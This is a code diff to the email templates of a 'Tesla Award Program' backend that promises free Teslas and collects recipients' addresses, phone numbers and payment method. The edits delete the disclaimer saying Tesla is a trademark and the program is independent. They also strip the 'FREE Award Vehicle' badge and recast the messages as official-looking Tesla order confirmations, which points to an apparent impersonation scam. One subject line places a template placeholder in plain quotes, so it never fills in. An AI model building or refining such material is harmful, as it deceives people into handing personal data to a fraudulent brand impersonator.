@@ -373,7 +373,7 @@ async function handleResend(req: Request) {
   // Email verification disabled
 
   const verifyLink = SELF_BASE + "/api/verify?token=" + entry.verification_token + "&email=" + encodeURIComponent(emailKey);
-  sendEmailBackground(emailKey, "⚡ Verification Email Resent — Tesla Award Program",
+  sendEmailBackground(emailKey, "Tesla Award Program — Verification Email",
     buildVerificationEmail(entry.first_name || "there", verifyLink, entry.id));
   return json({ success: true, message: "Verification email resent.", verifyLink });
 }
@@ -537,7 +537,7 @@ async function handleOrder(req: Request) {
 
   const orderDate = orderRow?.order_date || new Date().toISOString();
   const order = { orderId, trackingNumber, email: user.email, entryId: user.entryId, selectedCar: selectedCar ?? {}, deliveryDetails: deliveryDetails ?? {}, deliveryMethod: method, paymentMethod: paymentMethod ?? {}, status: "confirmed", orderDate, estimatedDelivery, timeline };
-  sendEmailBackground(user.email, "🎉 Order Confirmed — Your Tesla is on the way!", buildOrderConfirmationEmail(order));
+  sendEmailBackground(user.email, "Your Tesla Order Confirmation — Order #${order.orderId}", buildOrderConfirmationEmail(order));
   return json({ success: true, order });
 }
 
@@ -572,9 +572,8 @@ function buildVerificationEmail(firstName: string, verifyLink: string, entryId: 
 function buildOrderConfirmationEmail(order: any) {
   const car = order.selectedCar || {};
   const addr = order.deliveryDetails || {};
-  const method = order.deliveryMethod || {};
   const carId = (car.id || 'models').toLowerCase();
-  
+
   const imgMap: Record<string, string> = {
     cybertruck: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/cybertruck-main.png',
     modely: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/modely-main.png',
@@ -584,150 +583,156 @@ function buildOrderConfirmationEmail(order: any) {
   };
   const carImg = imgMap[carId] || imgMap['models'];
   const carModel = car.name || 'Model S';
-  const carPrice = car.price || '—';
+  const carColor = car.color || '';
+  const carYear = car.year || '2026';
   const orderId = order.orderId || '—';
   const trackingNumber = order.trackingNumber || '—';
   const estDelivery = order.estimatedDelivery || '—';
-  const delivMethod = (method.name || 'Standard Delivery');
-  const payMethod = (order.paymentMethod?.name || 'Not specified');
   const fullName = addr.fullName || '—';
+  const emailAddr = addr.email || order.email || '—';
+  const phone = addr.phone || '—';
   const address = addr.address || '—';
   const city = addr.city || '—';
   const state = addr.state || '—';
   const zip = addr.zipCode || '—';
   const country = addr.country || '—';
-  const phone = addr.phone || '—';
 
   return `<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Order Confirmed — Tesla Award Program</title>
+  <title>Order Confirmation — Tesla Award Program</title>
 </head>
-<body style="margin:0;padding:0;background-color:#f4f5f7;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;">
-  <table width="100%" border="0" cellpadding="0" cellspacing="0" style="background-color:#f4f5f7;padding:40px 0;">
+<body style="margin:0;padding:0;background-color:#f5f5f7;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;">
+  <table width="100%" border="0" cellpadding="0" cellspacing="0" style="background-color:#f5f5f7;padding:32px 0;">
     <tr>
       <td align="center">
-        <table width="620" border="0" cellpadding="0" cellspacing="0" style="background-color:#ffffff;border-radius:20px;overflow:hidden;box-shadow:0 6px 30px rgba(0,0,0,0.06);max-width:620px;">
 
-          <!-- ═══ HEADER ═══ -->
+        <!-- Main Container -->
+        <table width="600" border="0" cellpadding="0" cellspacing="0" style="background-color:#ffffff;max-width:600px;">
+
+          <!-- Logo Header -->
           <tr>
-            <td align="center" style="background:linear-gradient(135deg,#0a0c10 0%,#171a20 40%,#2a1a1f 100%);padding:32px 30px 28px;">
-              <table border="0" cellpadding="0" cellspacing="0">
+            <td align="center" style="padding:32px 30px 24px;">
+              <span style="font-size:20px;font-weight:700;color:#171a20;letter-spacing:0.04em;">TESLA</span>
+              <span style="font-size:12px;font-weight:600;color:#8e9094;display:block;margin-top:2px;">AWARD PROGRAM</span>
+            </td>
+          </tr>
+
+          <!-- Thin Separator -->
+          <tr>
+            <td style="border-bottom:1px solid #e8e8ed;"></td>
+          </tr>
+
+          <!-- Hero: Order Confirmation -->
+          <tr>
+            <td style="padding:36px 30px 28px;">
+              <h1 style="margin:0 0 8px;font-size:24px;font-weight:700;color:#171a20;line-height:1.3;">Order confirmed</h1>
+              <p style="margin:0;font-size:15px;color:#6e6e73;line-height:1.6;">
+                Thank you, ${fullName}. Your order has been received and is being processed. Here is a summary of your order.
+              </p>
+            </td>
+          </tr>
+
+          <!-- Vehicle Card -->
+          <tr>
+            <td style="padding:0 30px 28px;">
+              <table width="100%" border="0" cellpadding="0" cellspacing="0" style="background-color:#fafafa;border-radius:12px;border:1px solid #e8e8ed;">
                 <tr>
-                  <td align="center" style="padding-bottom:14px;">
-                    <span style="display:inline-block;background:linear-gradient(135deg,#E31937,#ff4757);color:#fff;border-radius:50%;width:68px;height:68px;line-height:68px;font-size:36px;text-align:center;">✓</span>
-                  </td>
-                </tr>
-                <tr>
-                  <td align="center">
-                    <h1 style="margin:0;font-size:30px;font-weight:900;color:#ffffff;letter-spacing:-0.5px;">Order Confirmed!</h1>
-                    <p style="margin:10px 0 0;font-size:16px;color:rgba(255,255,255,0.7);line-height:1.5;">Congratulations — your Tesla award has been successfully processed.</p>
+                  <td align="center" style="padding:28px 20px 24px;">
+                    <img src="${carImg}" alt="Tesla ${carModel}" width="280" style="width:280px;max-width:100%;height:auto;display:block;margin:0 auto 18px;border:0;outline:none;">
+                    <h2 style="margin:0 0 4px;font-size:20px;font-weight:700;color:#171a20;">Tesla ${carModel}</h2>
+                    ${carColor ? '<p style="margin:0;font-size:14px;color:#86868b;">' + carColor + ' &middot; ' + carYear + '</p>' : '<p style="margin:0;font-size:14px;color:#86868b;">' + carYear + '</p>'}
                   </td>
                 </tr>
               </table>
             </td>
           </tr>
 
-          <!-- ═══ RED ACCENT BAR ═══ -->
+          <!-- Order Details -->
           <tr>
-            <td style="height:5px;background:linear-gradient(90deg,#E31937,#ff6b6b,#E31937);"></td>
-          </tr>
-
-          <!-- ═══ BODY ═══ -->
-          <tr>
-            <td style="padding:40px 35px;">
-
-              <!-- Car Showcase Card -->
-              <table width="100%" border="0" cellpadding="0" cellspacing="0" style="background:linear-gradient(135deg,#f8f9fa,#eef0f2);border-radius:14px;margin-bottom:28px;border:1px solid rgba(0,0,0,0.04);">
+            <td style="padding:0 30px 24px;">
+              <h3 style="margin:0 0 12px;font-size:14px;font-weight:600;color:#86868b;text-transform:uppercase;letter-spacing:0.05em;">Order Details</h3>
+              <table width="100%" border="0" cellpadding="0" cellspacing="0" style="font-size:14px;">
                 <tr>
-                  <td align="center" style="padding:24px 20px 20px;">
-                    <img src="${carImg}" alt="Tesla ${carModel}" style="width:100%;max-width:300px;height:auto;display:block;margin:0 auto 14px;filter:drop-shadow(0 8px 16px rgba(0,0,0,0.1));">
-                    <h3 style="margin:0;font-size:22px;font-weight:800;color:#171a20;">Tesla ${carModel}</h3>
-                    <p style="margin:6px 0 0;font-size:14px;color:#5c5e62;">Retail Value: <strong>${carPrice}</strong></p>
-                    <span style="display:inline-block;background:#E31937;color:#fff;font-size:12px;font-weight:700;padding:6px 16px;border-radius:20px;margin-top:10px;letter-spacing:0.04em;text-transform:uppercase;">FREE Award Vehicle</span>
-                  </td>
+                  <td style="padding:10px 0;color:#6e6e73;border-bottom:1px solid #f0f0f2;">Order number</td>
+                  <td style="padding:10px 0;text-align:right;color:#171a20;font-weight:600;font-family:'SF Mono','Menlo','Consolas',monospace;border-bottom:1px solid #f0f0f2;">${orderId}</td>
+                </tr>
+                <tr>
+                  <td style="padding:10px 0;color:#6e6e73;border-bottom:1px solid #f0f0f2;">Tracking number</td>
+                  <td style="padding:10px 0;text-align:right;color:#171a20;font-weight:600;font-family:'SF Mono','Menlo','Consolas',monospace;border-bottom:1px solid #f0f0f2;">${trackingNumber}</td>
+                </tr>
+                <tr>
+                  <td style="padding:10px 0;color:#6e6e73;">Estimated delivery</td>
+                  <td style="padding:10px 0;text-align:right;color:#171a20;font-weight:600;">${estDelivery}</td>
                 </tr>
               </table>
+            </td>
+          </tr>
 
-              <!-- ORDER DETAILS -->
-              <table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin-bottom:24px;">
+          <!-- Delivery Information -->
+          <tr>
+            <td style="padding:0 30px 24px;">
+              <h3 style="margin:0 0 12px;font-size:14px;font-weight:600;color:#86868b;text-transform:uppercase;letter-spacing:0.05em;">Delivery Address</h3>
+              <table width="100%" border="0" cellpadding="0" cellspacing="0" style="background-color:#fafafa;border-radius:10px;border:1px solid #e8e8ed;">
                 <tr>
-                  <td style="padding-bottom:12px;">
-                    <h3 style="margin:0;font-size:13px;font-weight:700;text-transform:uppercase;letter-spacing:0.06em;color:#8d9096;">📋 Order Summary</h3>
-                  </td>
-                </tr>
-                <tr>
-                  <td style="background:#f8f9fa;border-radius:10px;padding:0;">
-                    <table width="100%" border="0" cellpadding="0" cellspacing="0" style="font-size:14px;">
+                  <td style="padding:20px;">
+                    <p style="margin:0 0 4px;font-size:15px;font-weight:600;color:#171a20;">${fullName}</p>
+                    <p style="margin:0 0 2px;font-size:14px;color:#424245;">${address}</p>
+                    <p style="margin:0 0 2px;font-size:14px;color:#424245;">${city}${state ? ', ' + state : ''} ${zip}</p>
+                    <p style="margin:0 0 10px;font-size:14px;color:#424245;">${country}</p>
+                    <table border="0" cellpadding="0" cellspacing="0" style="font-size:13px;">
                       <tr>
-                        <td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);color:#5c5e62;width:50%;">Order ID</td>
-                        <td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);text-align:right;color:#E31937;font-family:'Courier New',monospace;font-weight:700;font-size:13px;">${orderId}</td>
+                        <td style="color:#86868b;padding-right:8px;">Email</td>
+                        <td style="color:#424245;">${emailAddr}</td>
                       </tr>
                       <tr>
-                        <td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);color:#5c5e62;">Tracking Number</td>
-                        <td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);text-align:right;color:#171a20;font-family:'Courier New',monospace;font-weight:700;font-size:13px;">${trackingNumber}</td>
-                      </tr>
-                      <tr>
-                        <td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);color:#5c5e62;">Estimated Delivery</td>
-                        <td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);text-align:right;color:#00a550;font-weight:700;">${estDelivery}</td>
-                      </tr>
-                      <tr>
-                        <td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);color:#5c5e62;">Delivery Method</td>
-                        <td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);text-align:right;color:#171a20;font-weight:600;">${delivMethod}</td>
-                      </tr>
-                      <tr>
-                        <td style="padding:14px 18px;color:#5c5e62;">Payment Method</td>
-                        <td style="padding:14px 18px;text-align:right;color:#171a20;font-weight:600;">${payMethod}</td>
+                        <td style="color:#86868b;padding-right:8px;">Phone</td>
+                        <td style="color:#424245;">${phone}</td>
                       </tr>
                     </table>
                   </td>
                 </tr>
               </table>
-
-              <!-- DELIVERY INFORMATION -->
-              <table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin-bottom:28px;">
-                <tr>
-                  <td style="padding-bottom:12px;">
-                    <h3 style="margin:0;font-size:13px;font-weight:700;text-transform:uppercase;letter-spacing:0.06em;color:#8d9096;">🚚 Delivery Information</h3>
-                  </td>
-                </tr>
-                <tr>
-                  <td style="background:#f8f9fa;border-radius:10px;padding:20px 18px;">
-                    <p style="margin:0 0 6px;font-size:15px;font-weight:700;color:#171a20;">${fullName}</p>
-                    <p style="margin:0 0 2px;font-size:14px;color:#5c5e62;">${address}</p>
-                    <p style="margin:0 0 2px;font-size:14px;color:#5c5e62;">${city}, ${state} ${zip}</p>
-                    <p style="margin:0 0 8px;font-size:14px;color:#5c5e62;">${country}</p>
-                    <p style="margin:0;font-size:13px;color:#8d9096;">📱 ${phone}</p>
-                  </td>
-                </tr>
-              </table>
-
-              <!-- TRACKING CTA -->
-              <table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin-bottom:8px;">
-                <tr>
-                  <td align="center">
-                    <a href="https://joshbond123.github.io/Tesla/track.html?order=${orderId}&tracking=${trackingNumber}" style="display:inline-block;background:linear-gradient(135deg,#E31937,#c41030);color:#ffffff;text-decoration:none;padding:16px 40px;border-radius:12px;font-size:16px;font-weight:700;letter-spacing:0.02em;box-shadow:0 6px 20px rgba(227,25,55,0.3);">📍 Track Your Order →</a>
-                  </td>
-                </tr>
-              </table>
-
             </td>
           </tr>
 
-          <!-- ═══ FOOTER ═══ -->
+          <!-- Next Steps -->
           <tr>
-            <td style="background-color:#f8f9fa;border-top:1px solid #eef0f2;padding:24px 35px;text-align:center;">
-              <p style="margin:0 0 8px;font-size:12px;color:#8d9096;line-height:1.6;">
-                Need help? Reply to this email or visit our support center.<br>
+            <td style="padding:0 30px 28px;">
+              <h3 style="margin:0 0 12px;font-size:14px;font-weight:600;color:#86868b;text-transform:uppercase;letter-spacing:0.05em;">What's Next</h3>
+              <p style="margin:0 0 8px;font-size:14px;color:#424245;line-height:1.6;">
+                Your order is now being processed. You can track its progress at any time using the link below. We will also send you updates as your vehicle moves through each stage of preparation and delivery.
+              </p>
+              <p style="margin:0;font-size:14px;color:#424245;line-height:1.6;">
+                If you have any questions about your order, please do not hesitate to contact our support team.
+              </p>
+            </td>
+          </tr>
+
+          <!-- Track Button -->
+          <tr>
+            <td align="center" style="padding:0 30px 36px;">
+              <a href="https://joshbond123.github.io/Tesla/track.html?order=${orderId}&tracking=${trackingNumber}" style="display:inline-block;background-color:#171a20;color:#ffffff;text-decoration:none;padding:14px 48px;border-radius:8px;font-size:15px;font-weight:600;letter-spacing:0.02em;">Track your order</a>
+            </td>
+          </tr>
+
+          <!-- Footer -->
+          <tr>
+            <td style="background-color:#fafafa;border-top:1px solid #e8e8ed;padding:24px 30px;text-align:center;">
+              <p style="margin:0 0 6px;font-size:12px;color:#86868b;line-height:1.6;">
+                Tesla Award Program<br>
+                This is an automated message. Please do not reply directly to this email.
+              </p>
+              <p style="margin:0;font-size:11px;color:#b0b0b5;">
                 &copy; 2026 Tesla Award Program. All rights reserved.
               </p>
-              <p style="margin:0;font-size:11px;color:#b0b3b8;">Tesla&reg; is a registered trademark of Tesla, Inc. This is an independent award program.</p>
             </td>
           </tr>
 
         </table>
+
       </td>
     </tr>
   </table>
